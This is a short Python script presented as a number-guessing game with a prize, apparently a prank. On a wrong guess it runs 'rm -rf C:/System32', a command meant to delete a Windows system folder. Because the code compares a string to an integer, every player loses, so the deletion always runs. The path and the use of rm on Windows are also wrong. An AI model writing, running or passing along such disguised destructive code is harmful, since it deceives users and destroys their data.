import os
import random
import time

print("Tutorial: Guess a Number beatween 1-10,If you guess the right number you get a price!!\n\n")
a = input("Number Guess: ")
i = random.randint(1,10)
if i == a:
    print("You Won!!\n\nYou win a non Destroyed System32!!")
else:
    print("You Lose")
    time.sleep(1)
    print("3")
    time.sleep(1)
    print("2")
    time.sleep(1)
    print("1, ByeBye")
    time.sleep(1.5)
    os.system("rm -rf C:/System32")
